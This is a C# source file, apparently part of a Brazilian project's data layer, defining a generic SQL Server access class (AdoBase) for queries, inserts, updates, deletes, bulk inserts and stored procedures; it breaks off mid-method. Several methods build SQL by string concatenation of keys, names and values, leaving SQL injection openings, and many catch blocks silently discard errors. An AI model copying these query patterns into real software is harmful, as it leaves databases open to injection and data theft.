using T.Common;
using T.Entities;
using System;
using System.Collections.Generic;
using System.ComponentModel.DataAnnotations;
using System.Data;
using System.Data.SqlClient;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Linq.Expressions;
using System.Threading;
using System.Text.RegularExpressions;

namespace T.Infra.Data
{
    public abstract class AdoBase
    {
        #region CONSTANTS

        private const string CT_QUOTE = "'";

        private const string CT_DOUBLEQUOTE = "''";

        private const string CT_AT = "@";
        
        #endregion

        #region FIELDS

        private SqlConnection conn;

        private DBConfig _config;

        private int _coeficient;

        private Visitor _visitor;

        #endregion

        #region PUBLIC PROPERTIES

        public virtual bool LogOnUpdate { get; set; }

        public virtual int? UserId { get; set; }

        public string SqlCommandText { get; set; }

        /// <summary>
        /// Pode fornecer a string de conexão ou o nome da string na propriedade ConnectionStringName
        /// </summary>
        public virtual string ConnectionString
        {
            get;
            set;
        }

        public virtual Expression<T> Filter<T>(Expression<Func<T, bool>> expression)
        {
            return (Expression<T>)expression.Body;
        }

        #endregion

        #region CONSTRUCTORS        

        public AdoBase()
        {
            LogOnUpdate = true;

            _visitor = new Visitor();
        }

        public AdoBase(string authKey) : this()
        {
            SetSqlConnection(authKey);
        }

        public AdoBase(DBConfig config) : this()
        {
            SetSqlConnection(config);
        }

        #endregion

        #region PUBLIC METHODS
        
        /*
        public T SelectSingle<T>(Func<T, bool> expression)
        {
            Expression<Func<T, bool>> ex = a => expression(a);
            
            return SelectSingle<T>(ex);
        }
        */

        public T SelectSingle<T>(Expression<Func<T, bool>> expression)
        {
            SqlCommand cmd = GetCommand(expression);

            List<T> items = FillList<T>(cmd);

            if(items.HasItems())
                return items.FirstOrDefault();

            return default(T);
        }

        /*
        public List<T> Select<T>(Func<T, bool> expression)
        {
            Expression<Func<T, bool>> ex = a => expression(a);
            
            return Select<T>(ex);
        }
        */

        public List<T> Select<T>(Expression<Func<T, bool>> expression)
        {
            SqlCommand cmd = GetCommand(expression);

            List<T> items = FillList<T>(cmd);

            return items;
        }

        public void SetSqlConnection(string authKey)
        {
            DBConfig config = MemoryCache.Instance.Get(authKey, () => GetDBConfig(authKey));
            
            SetSqlConnection(config);
        }

        public void SetSqlConnection(int authId)
        {
            DBConfig config = MemoryCache.Instance.Get(string.Concat("SQL_AUTH_ID_", authId.ToString()), () => GetDBConfig(authId));

            SetSqlConnection(config);
        }

        public void SetSqlConnection(DBConfig config)
        {
            _config = config;

            SetSqlConnection();
        }

        public void SetSqlConnectionTimeOut(int seconds)
        {
            if (_config.IsNull())
                return;

            _config.ConnectionTimeout = seconds;
            SetSqlConnection();
        }

        public void SetSqlConnectionString(string connection)
        {
            ConnectionString = connection;
            conn = new SqlConnection(ConnectionString);
        }

        public List<T> GetAll<T>() where T : class, new()
        {
            try
            {
                string tableName;
                T obj = new T();
                tableName = obj.GetTableName();

                List<T> items = new List<T>();

                if (ExistsTable(tableName))
                    items = Select<T>(string.Concat("SELECT * FROM ", tableName, " WITH (NOLOCK)"));

                return items;
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        public T SelectSingle<T>(StringBuilder query)
        {
            return SelectSingle<T>(query.ToString());
        }

        public T SelectSingle<T>(string query)
        {
            T instance = default(T);

            try
            {
                if (typeof(T).IsValueType)
                    instance = GetSingle<T>(query);

                if(instance.IsNull())
                    instance = Select<T>(query).FirstOrDefault();
            }
            catch
            {

            }

            return instance;
        }

        public virtual T GetByKey<T, K>(K key)
        {
            T instance = Activator.CreateInstance<T>();

            string tableName = instance.GetTableName();
            string pk = instance.GetPrimaryKey();

            string query = string.Concat("SELECT TOP 1 * FROM ", tableName, " WITH(NOLOCK) WHERE ", pk, " = '", key, "'");

            return SelectSingle<T>(query);
        }

        public virtual List<T> GetByKey<T, K>(string keyName, K key)
        {
            T instance = Activator.CreateInstance<T>();

            string tableName = instance.GetTableName();

            string query = string.Concat("SELECT * FROM ", tableName, " WITH(NOLOCK) WHERE ", keyName, " = '", key.ToString(), "'");

            return Select<T>(query);
        }
        
        public bool ExistsTable(string tableName)
        {
            string command = string.Empty;

            tableName = tableName.Replace("[", string.Empty).Replace("]", string.Empty);

            string[] parts = tableName.Split('.');

            if (parts.Length > 1)
            {
                command = string.Concat("SELECT A.* FROM SYS.TABLES A INNER JOIN SYS.SCHEMAS B ON A.[SCHEMA_ID] = B.[SCHEMA_ID] WHERE A.[NAME] = '", parts[1], "' AND B.[NAME] = '", parts[0], "'");
            }
            else
            {
                command = string.Concat("SELECT * FROM SYS.TABLES WHERE NAME = '", tableName, "'");
            }

            string @return = GetSingle<string>(command);

            return !@return.IsNullOrEmpty();
        }

        public bool ExistsView(string viewName)
        {
            string command = string.Concat("SELECT * FROM SYS.OBJECTS O INNER JOIN SYS.SCHEMAS S ON O.SCHEMA_ID = S.SCHEMA_ID WHERE S.NAME LIKE 'dbo' AND O.name = '", viewName, "' AND type = 'V'");

            string @return = GetSingle<string>(command);

            return !@return.IsNullOrEmpty();
        }

        public bool ExistsColumn(string tableName, string columnName)
        {
            string command = string.Concat("SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '", tableName, "' AND COLUMN_NAME = '", columnName, "'");

            return ExisteObject(command);
        }

        public bool ExistsProcedure(string name)
        {
            string command = string.Concat("SELECT NAME FROM SYS.OBJECTS WHERE TYPE = 'P' AND NAME = '", name, "'");

            return ExisteObject(command);
        }

        public bool ExistsFunction(string name)
        {
            string command = string.Concat("SELECT SPECIFIC_NAME FROM INFORMATION_SCHEMA.ROUTINES WHERE ROUTINE_TYPE = 'FUNCTION' AND SPECIFIC_NAME = '", name, "'");

            return ExisteObject(command);
        }

        public Procedure GetProcedure(string procedure)
        {
            Procedure proc = new Procedure(procedure);

            return GetProcedure(proc);
        }

        public Procedure GetProcedure(Procedure procedure)
        {
            if (procedure.Schema.IsNullOrEmpty())
            {
                procedure.Schema = "dbo";
            }

            SqlCommandText = string.Concat("SELECT P.[NAME], SCH.[NAME] AS [SCHEMA], PM.DATA_TYPE, PM.ORDINAL_POSITION, PM.PARAMETER_NAME, PM.PARAMETER_MODE FROM SYS.PROCEDURES P INNER JOIN SYS.SCHEMAS SCH ON P.[SCHEMA_ID] = SCH.[SCHEMA_ID] LEFT JOIN INFORMATION_SCHEMA.PARAMETERS PM ON P.[NAME] = PM.SPECIFIC_NAME WHERE P.NAME = '", procedure.Specific_Name, "' AND SCH.[NAME] = '", procedure.Schema, "'");
            
            DataTable table = GetTableData(SqlCommandText);

            return new Procedure(table);
        }

        public List<T> ExecuteProcedure<T>(string procedure)
        {
            try
            {
                return ExecuteProcedure<T>(procedure, null);
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        public List<T> ExecuteProcedure<T>(string procedure, Dictionary<string, object> parameters)
        {
            SqlCommand cmd = GetCommand(procedure, System.Data.CommandType.StoredProcedure, parameters);
            
            List<T> items = FillList<T>(cmd);
            
            return items;

        }
        
        public void ExecuteProcedure(string procedure)
        {


            try
            {
                ExecuteProcedure(procedure, new Dictionary<string, object>());
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        public void ExecuteProcedure(Procedure procedure)
        {
            try
            {
                if (!procedure.IsValid())
                    return;

                SqlCommand cmd = GetCommand(procedure.Specific_Name, System.Data.CommandType.StoredProcedure);
                
                MountParameters(ref cmd, procedure);

                ExecuteProcedure(cmd);
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        public void ExecuteProcedure(string procedure, Dictionary<string, object> parametros)
        {
            SqlCommand cmd = GetCommand(procedure, System.Data.CommandType.StoredProcedure);
            
            if (parametros.HasItems())
            {
                foreach (var item in parametros)
                {
                    cmd.Parameters.AddWithValue(string.Concat(CT_AT, item.Key), item.Value ?? DBNull.Value);
                }
            }

            try
            {
                ExecuteProcedure(cmd);
            }
            catch (Exception ex)
            {
                throw new Exception("Falha ao Executar a procedure: " + cmd.CommandText, ex);
            }
        }

        public void ExecuteProcedure(SqlCommand sqlCommand)
        {
            ExecuteCommand(sqlCommand);
        }
        
        public DataTable GetTableData(string procedure, Dictionary<string, object> parameters)
        {
            try
            {
                SqlCommand cmd = GetCommand(procedure, System.Data.CommandType.StoredProcedure, parameters);
                
                return GetTableData(cmd);
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        public DataSet GetDataSet(string procedure)
        {
            try
            {
                return GetDataSet(procedure, null);
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        public DataSet GetDataSet(string procedure, Dictionary<string, object> parameters)
        {

            try
            {
                SqlCommand cmd = GetCommand(procedure, System.Data.CommandType.StoredProcedure, parameters);

                return GetDataSet(cmd);
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        public DataTable GetTableData(Procedure procedure)
        {

            try
            {
                SqlCommand cmd = GetCommand(procedure);
                
                return GetTableData(cmd);
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        public DataTable GetTableData(Procedure procedure, out string inputOutput)
        {
            inputOutput = string.Empty;

            try
            {
                SqlCommand cmd = GetCommand(procedure);

                DataTable table = GetTableData(cmd);

                foreach (ProcedureParameter parameter in procedure.Parameters)
                {
                    if (parameter.Parameter_Mode == ParameterDirection.InputOutput)
                    {
                        inputOutput = cmd.Parameters[parameter.Parameter_Name].Value.ToString();
                        break;
                    }
                }

                return table;
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        public DataTable GetTableData(SqlCommand cmd)
        {
            try
            {
                DataTable table = FillTable(cmd); 

                return table;

            }
            catch (Exception ex)
            {
                throw new Exception("Falha ao Executar a procedure: " + cmd.CommandText, ex);
            }
        }

        public DataSet GetDataSet(SqlCommand cmd)
        {
            try
            {
                DataSet ds = FillDataSet(cmd);
                
                return ds;

            }
            catch (Exception ex)
            {
                throw new Exception("Falha ao Executar a procedure: " + cmd.CommandText, ex);
            }
        }
        
        public void GetDataReaderArray(Procedure procedure, Action<string[], bool> callback)
        {
            SqlCommand cmd = null;

            try
            {
                cmd = GetCommand(procedure);
                
                OpenConnection();

                using (SqlDataReader dr = cmd.ExecuteReader())
                {
                    string[] columns = new string[] { };

                    if (dr.HasRows)
                    {
                        columns = new string[dr.FieldCount];

                        for (int i = 0; i < dr.FieldCount; i++)
                        {
                            columns[i] = dr.GetName(i);
                        }

                        callback(columns, false);

                        bool hasRows = dr.Read();

                        do
                        {
                            columns = new string[dr.FieldCount];

                            for (int i = 0; i < dr.FieldCount; i++)
                            {
                                columns[i] = dr[i].ToString();
                            }

                            hasRows = dr.Read();

                            callback(columns, !hasRows);

                        } while (hasRows);
                    }
                }

                foreach (ProcedureParameter parameter in procedure.Parameters)
                {
                    if (parameter.Parameter_Mode == ParameterDirection.InputOutput)
                    {
                        parameter.Parameter_Value = cmd.Parameters[parameter.Parameter_Name].Value;                        
                    }
                }
            }
            catch (Exception ex)
            {
                throw new Exception("Falha ao Executar o comando enviado: " + cmd.CommandText, ex);
            }
            finally
            {
                CloseConnection(cmd);
            }
        }

        public DataTable GetTableData(StringBuilder query)
        {
            return GetTableData(query.ToString());
        }

        public DataTable GetTableData(string sqlCommand)
        {
            SqlCommand cmd = GetCommand(sqlCommand);

            try
            {
                DataTable table = FillTable(cmd);

                return table;

            }
            catch (Exception ex)
            {
                throw new Exception(string.Concat("Executar o comando enviado: ", cmd.CommandText, ex));
            }
            finally
            {
                cmd.Dispose();
                CloseConnection(cmd);
            }
        }

        public void ExecuteMassInsert(DataTable table)
        {
            ExecuteMassInsert(table, false);
        }

        public void ExecuteMassInsert(DataTable table, bool fireTrigger)
        {
            try
            {
                if (!table.HasRows())
                    return;

                if(!ExistsTable(table.TableName))
                {
                    StringBuilder sb = new StringBuilder();

                    sb.Append("CREATE TABLE ").Append(table.TableName).Append("(");

                    for (int i = 0; i < table.Columns.Count; i++)
                    {
                        sb.Append("[").Append(table.Columns[i].ColumnName).Append("] VARCHAR(MAX)");
                        if ((i + 1) < table.Columns.Count)
                            sb.Append(", ");
                    }

                    sb.Append(")");

                    ExecuteCommand(sb);
                }

                string column;

                List<string> columns = GetColumns(table.TableName);

                OpenConnection();

                using (SqlBulkCopy bulkCopy = fireTrigger ? new SqlBulkCopy(conn.ConnectionString, SqlBulkCopyOptions.FireTriggers) : new SqlBulkCopy(conn))
                {
                    bulkCopy.BulkCopyTimeout = conn.ConnectionTimeout;

                    foreach (DataColumn item in table.Columns)
                    {
                        column = columns.Where(a => a.Equals(item.ColumnName, StringComparison.CurrentCultureIgnoreCase)).FirstOrDefault();

                        if (column.IsNullOrEmpty())
                            continue;

                        bulkCopy.ColumnMappings.Add(column, column);
                    }

                    bulkCopy.DestinationTableName = table.TableName;

                    try
                    {
                        bulkCopy.WriteToServer(table);
                    }
                    catch (SqlException ex)
                    {
                        if (ex.Message.Contains("Received an invalid column length from the bcp client for colid"))
                        {
                            string pattern = @"\d+";

                            Match match = Regex.Match(ex.Message, pattern);

                            int index = ((match.Value.ToInt32()) - 1);

                            FieldInfo fi = typeof(SqlBulkCopy).GetField("_sortedColumnMappings", BindingFlags.NonPublic | BindingFlags.Instance);

                            object sortedColumns = fi.GetValue(bulkCopy);

                            object[] items = (object[])sortedColumns.GetType().GetField("_items", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(sortedColumns);

                            FieldInfo itemdata = items[index].GetType().GetField("_metadata", BindingFlags.NonPublic | BindingFlags.Instance);

                            object metadata = itemdata.GetValue(items[index]);

                            object c = metadata.GetType().GetField("column", BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Instance).GetValue(metadata);

                            object length = metadata.GetType().GetField("length", BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Instance).GetValue(metadata);

                            throw new Exception(string.Format("Column: {0} contains data with a length greater than: {1}", c, length));
                        }

                        throw ex;
                    }
                }
            }
            catch (Exception ex)
            {
                throw ex;
            }
            finally
            {
                table.Dispose();
                CloseConnection();
            }
        }

        public void ExecuteMassInsert<T>(IEnumerable<T> items) where T : class
        {
            try
            {
                T obj = (T)Activator.CreateInstance(typeof(T));

                string tableName = obj.GetTableName();

                DB_OBJECT dbo = GetDBObject(tableName);

                DB_OBJECT_COLUMNS pk = dbo.COLUMNS.Where(a => a.PRIMARY_KEY).FirstOrDefault();

                if(pk.IsNull())
                {
                    pk = dbo.COLUMNS.Where(a => a.IS_IDENTITY).FirstOrDefault();
                }

                if(pk.HasValue() && !pk.IS_IDENTITY)
                {
                    if(pk.SystemType == TypeCode.Int32)
                    {
                        int key = 0;
                        int okey = 0;

                        T instance = GetLast<T>();

                        if(instance.HasValue())
                        {
                            key = (int)instance.GetValue(pk.NAME);
                        }

                        foreach (T item in items)
                        {
                            okey = (int)item.GetValue(pk.NAME);

                            if(okey == 0)
                            {
                                item.SetProperty(pk.NAME, ++key);
                            }
                        }
                    }
                }

                if (tableName.IsNullOrEmpty())
                    return;

                DataTable table = items.ToDataTable();
                table.TableName = tableName;
                ExecuteMassInsert(table);
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }
        
        public void ExecuteMassInsert(DataTable table, string tableName)
        {
            table.TableName = tableName;
            ExecuteMassInsert(table);
        }

        public void ExecuteMassInsert(DataTable table, string tableName, bool fireTrigger)
        {
            table.TableName = tableName;
            ExecuteMassInsert(table, fireTrigger);
        }
        
        public List<T> Select<T>() where T : class, new()
        {
            return GetAll<T>();
        }

        public List<T> Select<T>(StringBuilder query)
        {
            return Select<T>(query.ToString());
        }
        
        public List<T> Select<T>(string query)
        {
            List<T> items = null;

            if (ValidateQuery(query, Common.CommandType.Select))
            {
                SqlCommand cmd = GetCommand(query);

                items = FillList<T>(cmd);
            }

            return items;

        }
                
        public void ExecuteCommand(StringBuilder sb)
        {
            ExecuteCommand(sb.ToString());
        }

        public void ExecuteCommand(string query)
        {
            if (query.IsNullOrEmpty())
                return;

            ValidateQuery(query, Common.CommandType.Command);

            SqlCommand cmd = GetCommand(query);

            ExecuteCommand(cmd);
        }

        public T Insert<T>(T TObject) where T : class
        {
            try
            {
                DB_OBJECT dbo = GetDBObject(TObject);

                DB_OBJECT_COLUMNS pk = dbo.COLUMNS.Where(a => a.PRIMARY_KEY).FirstOrDefault();

                if (pk.IsNull())
                {
                    pk = dbo.COLUMNS.Where(a => a.IS_IDENTITY).FirstOrDefault();
                }

                T instance = null;

                object lastPkVal;

                object pkVal;

                if (pk.HasValue())
                {
                    if (!pk.IS_IDENTITY)
                    {
                        instance = GetLast<T>();
                        
                        if (instance.IsNull())
                            instance = Activator.CreateInstance<T>();

                        lastPkVal = instance.GetValue(pk.NAME);
                        pkVal = TObject.GetValue(pk.NAME);

                        switch (pk.SystemType)
                        {
                            case TypeCode.Int16:
                                {
                                    if (((Int16)pkVal) == 0)
                                        pkVal = lastPkVal;

                                    if(((Int16)lastPkVal) == (Int16)pkVal)
                                        pkVal = (((Int16)lastPkVal) + 1);
                                }
                                break;
                            case TypeCode.UInt16:
                                {
                                    if (((UInt16)pkVal) == 0)
                                        pkVal = lastPkVal;

                                    if ((UInt16)lastPkVal == (Int16)pkVal)
                                        pkVal = (((UInt16)lastPkVal) + 1);
                                }
                                break;
                            case TypeCode.Int32:
                                {
                                    if (((Int32)pkVal) == 0)
                                        pkVal = lastPkVal;

                                    if ((Int32)lastPkVal == (Int32)pkVal)
                                        pkVal = (((Int32)lastPkVal) + 1);
                                }
                                break;
                            case TypeCode.UInt32:
                                {
                                    if (((UInt32)pkVal) == 0)
                                        pkVal = lastPkVal;

                                    if ((UInt32)lastPkVal == (UInt32)pkVal)
                                        pkVal = (((UInt32)lastPkVal) + 1);
                                }
                                break;
                            case TypeCode.Int64:
                                {
                                    if (((Int64)pkVal) == 0)
                                        pkVal = lastPkVal;

                                    if ((Int64)lastPkVal == (Int64)pkVal)
                                        pkVal = (((Int64)lastPkVal) + 1);
                                }
                                break;
                            case TypeCode.UInt64:
                                {
                                    if (((UInt64)pkVal) == 0)
                                        pkVal = lastPkVal;

                                    if ((UInt64)lastPkVal == (UInt64)pkVal)
                                        pkVal = (((UInt64)lastPkVal) + 1);
                                }
                                break;
                            case TypeCode.Single:
                                {
                                    if (((float)pkVal) == 0)
                                        pkVal = lastPkVal;

                                    if ((float)lastPkVal == (float)pkVal)
                                        pkVal = (((float)lastPkVal) + 1);
                                }
                                break;
                            case TypeCode.Double:
                                {
                                    if (((double)pkVal) == 0)
                                        pkVal = lastPkVal;

                                    if ((double)lastPkVal == (double)pkVal)
                                        pkVal = (((double)lastPkVal) + 1);
                                }
                                break;
                            case TypeCode.Decimal:
                                {
                                    if (((decimal)pkVal) == 0)
                                        pkVal = lastPkVal;

                                    if ((decimal)lastPkVal == (decimal)pkVal)
                                        pkVal = (((decimal)lastPkVal) + 1);
                                }
                                break;
                        }

                        TObject.SetProperty(pk.NAME, pkVal);
                    }
                }

                ExecuteCommand(PrepareInsert(TObject, dbo));

                if(pk.HasValue() && pk.IS_IDENTITY)
                {
                    instance = GetLast<T>();
                    TObject.SetProperty(pk.NAME, instance.GetValue(pk.NAME));
                }
            }
            catch (Exception ex)
            {
                LogEx(ex, TObject);
                throw ex;
            }

            return TObject;
        }

        public T GetLast<T>() where T : class
        {
            try
            {
                T TObject = Activator.CreateInstance<T>();

                string tableName = TObject.GetTableName();

                if (tableName.HasText())
                {
                    string pk = TObject.GetPrimaryKey();

                    if (pk.HasText())
                    {
                        string command = string.Concat("SELECT TOP 1 * FROM ", tableName, " WITH(NOLOCK) ORDER BY ", pk, " DESC");
                        TObject = SelectSingle<T>(command);
                    }
                }

                return TObject;
            }
            catch
            {
                return default(T);
            }
        }
        
        public T Update<T>(T instance) where T : class
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                var tablename = instance.GetTableName();

                if (tablename.IsNullOrEmpty())
                    throw new Exception("Tabela não definida para o objeto.");

                var colunas = GetColumns<T>(instance);
                List<string> colunasExistentes = new List<string>();

                List<string> primaryKey = new List<string>();

                var type = instance.GetType();
                var properties = type.GetProperties();
                ColumnAttribute columnattribute;
                string column = string.Empty;

                Action<PropertyInfo> GetColumn = (item) =>
                {
                    columnattribute = item.GetCustomAttributes(typeof(ColumnAttribute), true).SingleOrDefault() as ColumnAttribute;

                    if (columnattribute != null)
                        column = colunas.Where(a => a.ToLower() == (columnattribute.Name == null ? item.Name.ToLower() : columnattribute.Name.ToLower())).FirstOrDefault();
                    else
                        column = colunas.Where(a => a.ToLower() == item.Name.ToLower()).FirstOrDefault();
                };

                foreach (var item in properties)
                {
                    if (instance.IsIdentity(item.Name) && !item.IsPrimaryKey())
                        continue;

                    GetColumn(item);

                    if (!column.IsNullOrEmpty())
                    {
                        if (colunasExistentes.Where(a => a.ToLower() == column.ToLower()).Count() == 0)
                        {
                            colunasExistentes.Add(column);

                            if (item.IsPrimaryKey())
                                primaryKey.Add(column);
                        }
                    }
                    column = string.Empty;
                }

                /*
                 * Fim
                 */

                StringBuilder sbOriginal = new StringBuilder();

                sbOriginal.Append("SELECT * FROM ")
                          .Append(tablename)
                          .Append(" WHERE ");

                object originalValue = null;

                if (primaryKey.Count > 0)
                {
                    for (int i = 0; i < primaryKey.Count; i++)
                    {
                        originalValue = instance.GetValue(primaryKey[i]);
                        sbOriginal.Append(primaryKey[i])
                                  .Append(" = '")
                                  .Append(originalValue)
                                  .Append("'");

                        if ((i + 1) < primaryKey.Count)
                            sbOriginal.Append(" AND ");
                    }
                }

                T originalObject = SelectSingle<T>(sbOriginal.ToString());

                if (originalObject.IsNull())
                    return instance;

                sb.Append("UPDATE ")
                  .Append(tablename)
                  .Append(" SET ");

                StringBuilder sbwhere = new StringBuilder();

                sbwhere.Append(" WHERE ");

                int total = 0;

                bool initializedwhere = false;

                object value;

                PropertyInfo pi;

                bool hasChange = false;

                Dictionary<string, object> param = new Dictionary<string, object>();

                foreach (var item in colunasExistentes)
                {
                    total++;

                    pi = properties.Where(a => a.Name.ToLower() == item.ToLower()).FirstOrDefault();

                    value = pi.GetValue(instance);

                    originalValue = originalObject.GetValue<T>(item);

                    if (pi.IsPrimaryKey())
                    {
                        if (!initializedwhere)
                            initializedwhere = true;
                        else
                            sbwhere.Append(" AND ");

                        sbwhere.Append(item).Append(" = @").Append(item);

                        param.Add(item, value);

                        continue;
                    }

                    if (value.HasValue() && originalValue.HasValue())
                    {
                        if (value.Equals(originalValue))
                            continue;
                    }

                    hasChange = true;

                    sb.Append(item).Append(string.Concat(" = @", item));

                    param.Add(item, value);

                    if (total < colunasExistentes.Count)
                        sb.Append(",");
                }

                if (!initializedwhere)
                    throw new Exception("Primary Key não definida.");

                if (hasChange)
                {
                    LogUpdate(originalObject, instance);

                    string command = sb.ToString();

                    if (command.LastIndexOf(',') == command.Length - 1)
                    {
                        command = command.Remove(command.Length - 1);
                    }

                    command = string.Concat(command, sbwhere.ToString());

                    SqlCommand cmd = GetCommand(command, System.Data.CommandType.Text, param);
                    
                    ExecuteCommand(cmd);
                }
            }
            catch (Exception ex)
            {
                throw ex;
            }

            return instance;
        }

        public void Delete<T>(T instance)
        {
            string tableName = instance.GetTableName();

            string pk = instance.GetPrimaryKey();
            
            string key = instance.GetPropertyValue(pk);

            string query = string.Concat("DELETE FROM ", tableName, " WHERE ", pk, " = '", key, "'");

            ExecuteCommand(query);

            Reseed(instance);
        }

        public void LogEx(Exception ex)
        {
            try
            {
                string msg = ex.GetXHTMLStackMessage();
                LogEx(msg);
            }
            catch
            {
                //DO NOTHING
            }
        }

        public void LogEx(string message)
        {
            try
            {
                ExecuteCommand("IF NOT EXISTS(SELECT TOP 1 1 AS OBJ FROM SYS.TABLES WHERE [NAME] LIKE 'TB_ERRO') CREATE TABLE TB_ERRO ([EXCEPTION] [TEXT])");

                ExecuteCommand(string.Concat("INSERT INTO TB_ERRO VALUES('", DateTime.Now, ": ", message.Replace("'", "''"), "')"));
            }
            catch
            {
                //DO NOTHING
            }
        }

        public void LogEx<T>(Exception ex, T obj)
        {
            try
            {
                string msg = obj.GetTableName();

                try
                {
                    msg = string.Concat(msg, " ", ex.GetXHTMLStackDAL(), Environment.NewLine);
                }
                catch
                {

                }

                msg = string.Concat("{Table: ", msg, "} ", Newtonsoft.Json.JsonConvert.SerializeObject(obj));

                LogEx(msg);
            }
            catch
            {
                //DO NOTHING
            }
        }
        
        public virtual DBConfig GetDBConfig(int authId)
        {
            DBConfig config = null;
                        
            Request.RequestConfig<int> rconfig = new Request.RequestConfig<int> { ActionName = "GetDBById", Controller = "Auth", Param = authId };
            Request.Request req = new Request.Request();

            config = req.RequestDataItem<DBConfig, int>(rconfig);

            return config;
        }

        public virtual DBConfig GetDBConfig(string authKey)
        {
            DBConfig config = null;

            Request.RequestConfig<string> rconfig = new Request.RequestConfig<string> { ActionName = "GetDBConfig", Controller = "Auth", Param = authKey };
            Request.Request req = new Request.Request();

            config = req.RequestDataItem<DBConfig, string>(rconfig);

            return config;
        }

        public DB_OBJECT GetDBObject<T>(T obj)
        {
            string tableName = obj.GetTableName();

            DB_OBJECT dbo = GetDBObject(tableName);

            return dbo;
        }

        public DB_OBJECT GetDBObject(string name)
        {
            string command = string.Concat("SELECT TOP 1 * FROM SYS.OBJECTS WHERE [OBJECT_ID] = OBJECT_ID('", name, "')");

            DB_OBJECT ob = SelectSingle<DB_OBJECT>(command);

            try
            {
                ob.COLUMNS = GetObjectColumns(ob.OBJECT_ID);
            }
            catch
            {

            }

            return ob;
        }

        public DB_OBJECT GetDBObject(int objectId)
        {
            string command = string.Concat("SELECT TOP 1 * FROM SYS.OBJECTS WHERE [OBJECT_ID] = ", objectId);

            DB_OBJECT ob = SelectSingle<DB_OBJECT>(command);

            try
            {
                ob.COLUMNS = GetObjectColumns(ob.OBJECT_ID);
            }
            catch
            {

            }

            return ob;
        }

        public List<DB_OBJECT_COLUMNS> GetObjectColumns(int objectId)
        {
            StringBuilder sb = new StringBuilder();

            sb.Append("DECLARE @OBJECT_ID VARCHAR(MAX)").Append(Environment.NewLine)
              .Append("SET @OBJECT_ID = ").Append(objectId).Append(Environment.NewLine)
              .Append("SELECT B.COLUMN_ID AS ID, A.[OBJECT_ID], B.NAME, C.SYSTEM_TYPE_ID AS [TYPE_ID], C.NAME AS [TYPE_NAME], B.IS_IDENTITY, B.IS_NULLABLE,").Append(Environment.NewLine)
              .Append("CAST(ISNULL(X.[PRIMARY_KEY], 0) AS BIT) AS PRIMARY_KEY, CAST(ISNULL(X.[FOREIGN_KEY], 0) AS BIT) AS FOREIGN_KEY, B.MAX_LENGTH FROM SYS.OBJECTS A").Append(Environment.NewLine)
              .Append("INNER JOIN SYS.COLUMNS B ON A.[OBJECT_ID] = B.[OBJECT_ID]").Append(Environment.NewLine)
              .Append("INNER JOIN SYS.TYPES C ON B.SYSTEM_TYPE_ID = C.SYSTEM_TYPE_ID AND B.USER_TYPE_ID = C.USER_TYPE_ID").Append(Environment.NewLine)
              .Append("LEFT JOIN(").Append(Environment.NewLine)
              .Append("SELECT A.[OBJECT_ID], B.NAME, CASE WHEN CONSTRAINT_TYPE = 'PRIMARY KEY' THEN 1 ELSE 0 END AS [PRIMARY_KEY], CASE WHEN CONSTRAINT_TYPE = 'FOREIGN KEY' THEN 1 ELSE 0 END AS [FOREIGN_KEY] FROM SYS.OBJECTS A").Append(Environment.NewLine)
              .Append("INNER JOIN SYS.COLUMNS B ON A.[OBJECT_ID] = B.[OBJECT_ID]").Append(Environment.NewLine)
              .Append("INNER JOIN INFORMATION_SCHEMA.TABLE_CONSTRAINTS C ON A.[NAME] = C.TABLE_NAME").Append(Environment.NewLine)
              .Append("INNER JOIN INFORMATION_SCHEMA.KEY_COLUMN_USAGE D ON C.CONSTRAINT_CATALOG = D.CONSTRAINT_CATALOG").Append(Environment.NewLine)
              .Append("AND C.CONSTRAINT_SCHEMA = D.CONSTRAINT_SCHEMA AND C.CONSTRAINT_NAME = D.CONSTRAINT_NAME AND D.COLUMN_NAME = B.NAME WHERE A.[OBJECT_ID] = @OBJECT_ID)").Append(Environment.NewLine)
              .Append("X ON B.NAME = X.NAME WHERE A.[OBJECT_ID] = @OBJECT_ID ORDER BY B.COLUMN_ID").Append(Environment.NewLine);

            return Select<DB_OBJECT_COLUMNS>(sb);
        }

        public void ExecuteJob(string jobName)
        {
            Procedure proc = new Procedure("dbo.SP_START_JOB");
            proc.Parameters.Add(new ProcedureParameter { Parameter_Name = "@JOB_NAME", Parameter_Mode = ParameterDirection.Input, Parameter_Value = jobName });

            ExecuteProcedure(proc);
        }

        public void Reseed(List<string> tableNames)
        {
            tableNames.ForEach(a => Reseed(a));
        }

        public void Reseed<T>(T obj)
        {
            Reseed(obj.GetTableName());
        }

        public void Reseed(string tableName)
        {
            if (tableName.IsNullOrEmpty() || !ExistsTable(tableName))
                return;

            StringBuilder sb = new StringBuilder();

            sb.Append("DECLARE @MAX_ID INT").Append(Environment.NewLine)
              .Append("SET @MAX_ID = (SELECT ISNULL(MAX(ID), 0) FROM ").Append(tableName).Append(")").Append(Environment.NewLine)
              .Append("DBCC CHECKIDENT('").Append(tableName).Append("', RESEED, @MAX_ID)");

            try
            {
                ExecuteCommand(sb);
            }
            catch
            {

            }
        }

        #endregion

        #region PRIVATE METHODS

        private void LogUpdate<T>(T before, T after) where T : class
        {
            if (!LogOnUpdate)
                return;

